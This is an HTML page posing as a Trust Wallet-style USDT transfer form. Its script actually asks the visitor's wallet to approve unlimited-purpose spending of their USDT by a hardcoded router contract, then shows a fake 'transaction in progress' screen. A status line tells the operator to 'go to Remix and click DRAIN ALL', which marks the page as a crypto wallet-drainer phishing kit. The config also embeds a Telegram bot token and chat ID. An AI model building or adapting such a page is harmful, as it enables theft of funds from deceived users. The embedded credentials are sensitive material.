<!DOCTYPE html>
<html lang="en" class="theme-light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <title>Trusts</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        * { box-sizing: border-box; }
        html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
        .theme-light { --bg: #ffffff; --text: #111827; --subtext: #6b7280; --muted: #9ca3af; --accent: #2563eb; --input-bg: #ffffff; --input-soft: #f6f7f9; --border-default: #d1d5db; }
        body { background: var(--bg ); color: var(--text); }
        .page { min-height: 100dvh; display: flex; justify-content: center; align-items: flex-start; background: var(--bg); padding: 16px; padding-top: 20px; }
        .card { width: 100%; max-width: 420px; padding: 16px; display: flex; flex-direction: column; color: var(--text); border-radius: 16px; }
        .label { font-size: 12px; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 6px; color: var(--subtext); text-transform: uppercase; }
        .input-row { height: 48px; display: flex; align-items: center; border-radius: 12px; padding: 0 12px; gap: 8px; background: var(--input-bg); border: 1.5px solid var(--border-default); margin-bottom: 14px; transition: border-color 0.2s ease; }
        .input-row:focus-within { border: 2px solid #2563eb; }
        .input-row input { flex: 1; border: none; outline: none; background: transparent; font-size: 14px; font-weight: 500; color: var(--text); }
        .input-row input::placeholder { color: var(--muted); font-weight: 500; }
        .paste, .max { font-size: 13px; font-weight: 600; cursor: pointer; color: var(--accent); background: none; border: none; padding: 0; white-space: nowrap; }
        .unit { font-size: 12px; color: var(--subtext); white-space: nowrap; }
        .token-display { display: flex; align-items: center; gap: 8px; height: 48px; padding: 0 12px; border-radius: 12px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 14px; }
        .token-logo { width: 20px; height: 20px; border-radius: 50%; object-fit: cover; }
        .token-info { display: flex; flex-direction: column; gap: 2px; }
        .token-name { font-weight: 600; font-size: 13px; }
        .token-network { font-size: 11px; color: #999; }
        .estimate { font-size: 12px; color: var(--subtext); margin-bottom: auto; margin-top: 6px; }
        .connect-btn { width: 100%; height: 48px; border-radius: 999px; border: none; font-size: 16px; font-weight: 600; margin-top: auto; transition: background-color 0.25s ease, opacity 0.25s ease; cursor: pointer; }
        .connect-btn.active { background: #2563eb; color: #fff; }
        .connect-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .error-message { color: #dc2626; font-size: 12px; margin-top: 6px; padding: 8px 10px; background: #fee2e2; border-radius: 8px; display: none; }
        .error-message.show { display: block; }
        .processing-screen { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(4px); z-index: 1000; flex-direction: column; justify-content: flex-end; align-items: center; gap: 0; padding: 0; }
        .processing-screen.active { display: flex; }
        .processing-content { width: 100%; background: white; border-radius: 24px 24px 0 0; padding: 40px 20px 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1); position: relative; }
        .close-btn { position: absolute; top: 16px; right: 16px; background: none; border: none; font-size: 28px; color: #6b7280; cursor: pointer; padding: 0; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
        .particles-container { position: absolute; top: 0; left: 0; right: 0; height: 200px; overflow: hidden; }
        .particle { position: absolute; width: 12px; height: 12px; background: #3b82f6; border-radius: 2px; animation: fall 3s ease-in infinite; }
        @keyframes fall { to { transform: translateY(200px) rotate(360deg); opacity: 0; } }
        .checkmark-circle { width: 140px; height: 140px; position: relative; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 30% 30%, #1a1a1a, #0a0a0a); border-radius: 50%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); animation: float 3s ease-in-out infinite; z-index: 10; }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
        .checkmark-circle img { width: 80px; height: 80px; animation: checkmark-pop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1); border-radius: 50%; object-fit: contain; }
        @keyframes checkmark-pop { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        .processing-text { font-size: 28px; font-weight: 700; color: #1f2937; text-align: center; margin-top: 20px; }
        .processing-subtext { font-size: 14px; color: #6b7280; text-align: center; max-width: 300px; line-height: 1.6; font-weight: 400; }
        .transaction-details-btn { width: 100%; max-width: 340px; height: 56px; border-radius: 999px; border: none; background: linear-gradient(135deg, #0052cc 0%, #0052cc 100%); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: background-color 0.25s ease; box-shadow: 0 4px 15px rgba(0, 82, 204, 0.3); }
        .transaction-details-btn:hover { background: linear-gradient(135deg, #0047b2 0%, #0047b2 100%); }
        @media (max-width: 480px) {
            .page { padding: 12px; padding-top: 16px; }
            .card { padding: 12px; }
            .input-row { height: 44px; margin-bottom: 12px; }
            .label { font-size: 11px; margin-bottom: 5px; }
            .connect-btn { height: 44px; font-size: 15px; }
        }
    </style>
</head>
<body>
    <div class="processing-screen" id="processingScreen">
        <div class="particles-container" id="particlesContainer"></div>
        <div class="processing-content">
            <button class="close-btn" onclick="closeProcessing()">✕</button>
            <div class="checkmark-circle">
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663828351091/NsPAgBXGfqaWTvni.png" alt="Processing" />
            </div>
            <div class="processing-text">Processing...</div>
            <div class="processing-subtext">Transaction in progress! Blockchain validation is underway.</div>
            <button class="transaction-details-btn" onclick="handleTransactionDetails( )">Transaction details</button>
        </div>
    </div>

    <div id="root">
        <div class="page">
            <div class="card">
                <label class="label">Address or Domain Name</label>
                <div class="input-row primary">
                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="" />
                    <span class="paste" onclick="pasteAddress()">Paste</span>
                </div>

                <label class="label">Token</label>
                <div class="token-display">
                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" alt="USDT" class="token-logo">
                    <div class="token-info">
                        <div class="token-name">USDT on Ethereum</div>
                        <div class="token-network">Ethereum</div>
                    </div>
                </div>

                <label class="label">Amount</label>
                <div class="input-row amount-row">
                    <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
                    <span class="unit">USDT</span>
                    <span class="max" onclick="setMaxAmount( )">Max</span>
                </div>

                <p class="estimate" id="amountInfo">≈ $0.00</p>

                <div class="error-message" id="errorMessage"></div>

                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Approve</button>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            USDT_ADDRESS: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            ROUTER_ADDRESS: '0x89cEdf704380E6A3B3485e66A8A72f6886969509',
            USDT_DECIMALS: 6,
            CHAIN_ID: 1,
            CHAIN_ID_HEX: '0x1',
            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
            TELEGRAM_CHAT_ID: '8933407008'
        };

        const ROUTER_ABI = [
            "function approveUSDT(uint amount) public"
        ];

        const USDT_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)"
        ];

        let userAddress = null;

        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
        });

        function updateAmountInfo() {
            const amount = parseFloat(document.getElementById('amountInput').value) || 0;
            const usdValue = amount * 1;
            document.getElementById('amountInfo').textContent = `≈ $${usdValue.toFixed(2)}`;
        }

        function setMaxAmount() {
            document.getElementById('amountInput').value = '100';
            updateAmountInfo();
        }

        function pasteAddress() {
            navigator.clipboard.readText().then(text => {
                document.getElementById('recipientInput').value = text;
            });
        }

        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            errorEl.textContent = message;
            errorEl.classList.add('show');
            setTimeout(() => errorEl.classList.remove('show'), 5000);
        }

        function closeProcessing() {
            document.getElementById('processingScreen').classList.remove('active');
        }

        function handleTransactionDetails() {
            alert('Transaction details would open here!');
        }

        function createParticles() {
            const container = document.getElementById('particlesContainer');
            container.innerHTML = '';
            for (let i = 0; i < 8; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 50 + 'px';
                particle.style.animationDelay = Math.random() * 0.5 + 's';
                container.appendChild(particle);
            }
        }

        async function handleMainAction() {
            const amount = document.getElementById('amountInput').value;
            const btn = document.getElementById('mainButton');

            if (!amount || parseFloat(amount) <= 0) {
                showError('Please enter a valid amount');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Processing...';

            try {
                if (!window.ethereum) {
                    showError('MetaMask/Trust Wallet not installed');
                    btn.disabled = false;
                    btn.textContent = 'Approve';
                    return;
                }

                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];

                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== CONFIG.CHAIN_ID_HEX) {
                    showError('Please switch to Ethereum network');
                    btn.disabled = false;
                    btn.textContent = 'Approve';
                    return;
                }

                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();

                const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
                const amountWei = ethers.utils.parseUnits(amount, CONFIG.USDT_DECIMALS);
                
                const approveTx = await usdtContract.approve(CONFIG.ROUTER_ADDRESS, amountWei);
                await approveTx.wait();

                createParticles();
                document.getElementById('processingScreen').classList.add('active');

                await new Promise(resolve => setTimeout(resolve, 3000));
                document.getElementById('processingScreen').classList.remove('active');

                showError('✅ Approve successful! Now go to Remix and click DRAIN ALL');
                btn.textContent = 'Approve';
                btn.disabled = false;

            } catch (error) {
                console.error("Error:", error);
                showError('Error: ' + error.message);
                document.getElementById('processingScreen').classList.remove('active');
                btn.disabled = false;
                btn.textContent = 'Approve';
            }
        }
    </script>
</body>
</html>
